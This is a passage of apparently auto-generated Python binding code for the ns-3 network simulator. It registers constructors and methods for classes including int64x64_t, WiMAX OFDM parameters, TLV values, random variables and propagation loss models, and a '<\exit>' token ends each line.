cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_binary_comparison_operator('>')<\exit>
cls.add_inplace_numeric_operator('*=', param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_inplace_numeric_operator('-=', param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_inplace_numeric_operator('/=', param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('<=')<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_binary_comparison_operator('>=')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'v')])<\exit>
cls.add_constructor([param('int', 'v')])<\exit>
cls.add_constructor([param('long int', 'v')])<\exit>
cls.add_constructor([param('long long int', 'v')])<\exit>
cls.add_constructor([param('unsigned int', 'v')])<\exit>
cls.add_constructor([param('long unsigned int', 'v')])<\exit>
cls.add_constructor([param('long long unsigned int', 'v')])<\exit>
cls.add_constructor([param('int64_t', 'hi'), param('uint64_t', 'lo')])<\exit>
cls.add_constructor([param('ns3::int64x64_t const &', 'o')])<\exit>
cls.add_method('GetDouble',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHigh',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLow',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Invert',<\exit>
'ns3::int64x64_t',<\exit>
[param('uint64_t', 'v')],<\exit>
is_static=True)<\exit>
cls.add_method('MulByInvert',<\exit>
'void',<\exit>
[param('ns3::int64x64_t const &', 'o')])<\exit>
return<\exit>
def register_Ns3SimpleOfdmSendParam_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::simpleOfdmSendParam const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::bvec const &', 'fecBlock'), param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'Frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPowerDbm')])<\exit>
cls.add_constructor([param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'Frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPowerDbm'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('GetBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[])<\exit>
cls.add_method('GetBurstSize',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetDirection',<\exit>
'uint8_t',<\exit>
[])<\exit>
cls.add_method('GetFecBlock',<\exit>
'ns3::bvec',<\exit>
[])<\exit>
cls.add_method('GetFrequency',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('GetIsFirstBlock',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('GetModulationType',<\exit>
'ns3::WimaxPhy::ModulationType',<\exit>
[])<\exit>
cls.add_method('GetRxPowerDbm',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('SetBurstSize',<\exit>
'void',<\exit>
[param('uint32_t', 'burstSize')])<\exit>
cls.add_method('SetDirection',<\exit>
'void',<\exit>
[param('uint8_t', 'direction')])<\exit>
cls.add_method('SetFecBlock',<\exit>
'void',<\exit>
[param('ns3::bvec const &', 'fecBlock')])<\exit>
cls.add_method('SetFrequency',<\exit>
'void',<\exit>
[param('uint64_t', 'Frequency')])<\exit>
cls.add_method('SetIsFirstBlock',<\exit>
'void',<\exit>
[param('bool', 'isFirstBlock')])<\exit>
cls.add_method('SetModulationType',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('SetRxPowerDbm',<\exit>
'void',<\exit>
[param('double', 'rxPowerDbm')])<\exit>
return<\exit>
def register_Ns3Chunk_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Chunk const &', 'arg0')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3ClassificationRuleVectorTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ClassificationRuleVectorTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::ClassificationRuleVectorTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3ConstantVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ConstantVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'c')])<\exit>
cls.add_method('SetConstant',<\exit>
'void',<\exit>
[param('double', 'c')])<\exit>
return<\exit>
def register_Ns3CsParamVectorTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CsParamVectorTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::CsParamVectorTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3DeterministicVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DeterministicVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('double *', 'd'), param('uint32_t', 'c')])<\exit>
return<\exit>
def register_Ns3EmpiricalVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::EmpiricalVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CDF',<\exit>
'void',<\exit>
[param('double', 'v'), param('double', 'c')])<\exit>
return<\exit>
def register_Ns3ErlangVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ErlangVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('unsigned int', 'k'), param('double', 'lambda')])<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[param('unsigned int', 'k'), param('double', 'lambda')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ExponentialVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ExponentialVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'm')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 'b')])<\exit>
return<\exit>
def register_Ns3GammaVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::GammaVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'alpha'), param('double', 'beta')])<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[param('double', 'alpha'), param('double', 'beta')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Header_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Header const &', 'arg0')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3IntEmpiricalVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::IntEmpiricalVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
return<\exit>
def register_Ns3Ipv4AddressTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Ipv4AddressTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address', 'address'), param('ns3::Ipv4Mask', 'Mask')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ipv4AddressTlvValue::ipv4Addr const *, std::vector< ns3::Ipv4AddressTlvValue::ipv4Addr > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ipv4AddressTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ipv4AddressTlvValue::ipv4Addr const *, std::vector< ns3::Ipv4AddressTlvValue::ipv4Addr > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3Ipv4AddressTlvValueIpv4Addr_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4AddressTlvValue::ipv4Addr const &', 'arg0')])<\exit>
cls.add_instance_attribute('Address', 'ns3::Ipv4Address', is_const=False)<\exit>
cls.add_instance_attribute('Mask', 'ns3::Ipv4Mask', is_const=False)<\exit>
return<\exit>
def register_Ns3LogNormalVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::LogNormalVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('double', 'mu'), param('double', 'sigma')])<\exit>
return<\exit>
def register_Ns3MacHeaderType_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::MacHeaderType const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t', 'type')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
return<\exit>
def register_Ns3ManagementMessageType_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ManagementMessageType const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint8_t', 'type')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
return<\exit>
def register_Ns3NormalVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::NormalVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 'v')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 'v'), param('double', 'b')])<\exit>
return<\exit>
def register_Ns3Object_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AggregateObject',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Object >', 'other')])<\exit>
cls.add_method('Dispose',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('GetAggregateIterator',<\exit>
'ns3::Object::AggregateIterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Start',<\exit>
'void',<\exit>
[])<\exit>
cls.add_constructor([param('ns3::Object const &', 'o')],<\exit>
visibility='protected')<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
cls.add_method('DoStart',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
cls.add_method('NotifyNewAggregate',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ObjectAggregateIterator_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Object::AggregateIterator const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('HasNext',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Next',<\exit>
'ns3::Ptr< ns3::Object const >',<\exit>
[])<\exit>
return<\exit>
def register_Ns3OfdmDownlinkFramePrefix_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmDownlinkFramePrefix const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddDlFramePrefixElement',<\exit>
'void',<\exit>
[param('ns3::DlFramePrefixIe', 'dlFramePrefixElement')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBaseStationId',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConfigurationChangeCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlFramePrefixElements',<\exit>
'std::vector< ns3::DlFramePrefixIe >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameNumber',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHcs',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetBaseStationId',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'baseStationId')])<\exit>
cls.add_method('SetConfigurationChangeCount',<\exit>
'void',<\exit>
[param('uint8_t', 'configurationChangeCount')])<\exit>
cls.add_method('SetFrameNumber',<\exit>
'void',<\exit>
[param('uint32_t', 'frameNumber')])<\exit>
cls.add_method('SetHcs',<\exit>
'void',<\exit>
[param('uint8_t', 'hcs')])<\exit>
return<\exit>
def register_Ns3OfdmSendParams_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmSendParams const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('uint8_t', 'modulationType'), param('uint8_t', 'direction')])<\exit>
cls.add_method('GetBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDirection',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetModulationType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3OfdmUcdChannelEncodings_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OfdmUcdChannelEncodings const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetSbchnlFocContCodes',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSbchnlReqRegionFullParams',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetSbchnlFocContCodes',<\exit>
'void',<\exit>
[param('uint8_t', 'sbchnlFocContCodes')])<\exit>
cls.add_method('SetSbchnlReqRegionFullParams',<\exit>
'void',<\exit>
[param('uint8_t', 'sbchnlReqRegionFullParams')])<\exit>
cls.add_method('DoRead',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoWrite',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3PacketBurst_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PacketBurst const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddPacket',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet')])<\exit>
cls.add_method('Begin',<\exit>
'std::_List_const_iterator< ns3::Ptr< ns3::Packet > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('End',<\exit>
'std::_List_const_iterator< ns3::Ptr< ns3::Packet > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNPackets',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPackets',<\exit>
'std::list< ns3::Ptr< ns3::Packet > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ParetoVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ParetoVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'm')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 's')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 's'), param('double', 'b')])<\exit>
cls.add_constructor([param('std::pair< double, double >', 'params')])<\exit>
cls.add_constructor([param('std::pair< double, double >', 'params'), param('double', 'b')])<\exit>
return<\exit>
def register_Ns3PcapFileWrapper_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Fail',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Eof',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Clear',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Open',<\exit>
'void',<\exit>
[param('std::string const &', 'filename'), param('std::_Ios_Openmode', 'mode')])<\exit>
cls.add_method('Close',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Init',<\exit>
'void',<\exit>
[param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='std::numeric_limits<unsigned int>::max()'), param('int32_t', 'tzCorrection', default_value='ns3::PcapFile::ZONE_DEFAULT')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('ns3::Time', 't'), param('ns3::Ptr< ns3::Packet const >', 'p')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('ns3::Time', 't'), param('ns3::Header &', 'header'), param('ns3::Ptr< ns3::Packet const >', 'p')])<\exit>
cls.add_method('Write',<\exit>
'void',<\exit>
[param('ns3::Time', 't'), param('uint8_t const *', 'buffer'), param('uint32_t', 'length')])<\exit>
cls.add_method('GetMagic',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetVersionMajor',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('GetVersionMinor',<\exit>
'uint16_t',<\exit>
[])<\exit>
cls.add_method('GetTimeZoneOffset',<\exit>
'int32_t',<\exit>
[])<\exit>
cls.add_method('GetSigFigs',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSnapLen',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetDataLinkType',<\exit>
'uint32_t',<\exit>
[])<\exit>
return<\exit>
def register_Ns3PortRangeTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PortRangeTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('uint16_t', 'portLow'), param('uint16_t', 'portHigh')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::PortRangeTlvValue::PortRange const *, std::vector< ns3::PortRangeTlvValue::PortRange > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::PortRangeTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::PortRangeTlvValue::PortRange const *, std::vector< ns3::PortRangeTlvValue::PortRange > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3PortRangeTlvValuePortRange_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::PortRangeTlvValue::PortRange const &', 'arg0')])<\exit>
cls.add_instance_attribute('PortHigh', 'uint16_t', is_const=False)<\exit>
cls.add_instance_attribute('PortLow', 'uint16_t', is_const=False)<\exit>
return<\exit>
def register_Ns3PriorityUlJob_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::PriorityUlJob const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetPriority',<\exit>
'int',<\exit>
[])<\exit>
cls.add_method('GetUlJob',<\exit>
'ns3::Ptr< ns3::UlJob >',<\exit>
[])<\exit>
cls.add_method('SetPriority',<\exit>
'void',<\exit>
[param('int', 'priority')])<\exit>
cls.add_method('SetUlJob',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::UlJob >', 'job')])<\exit>
return<\exit>
def register_Ns3PropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetNext',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PropagationLossModel >', 'next')])<\exit>
cls.add_method('CalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True)<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ProtocolTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ProtocolTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('uint8_t', 'protiocol')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< unsigned char const *, std::vector< unsigned char > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::ProtocolTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< unsigned char const *, std::vector< unsigned char > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3RandomPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3RangePropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3RngReq_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::RngReq const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMacAddress',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
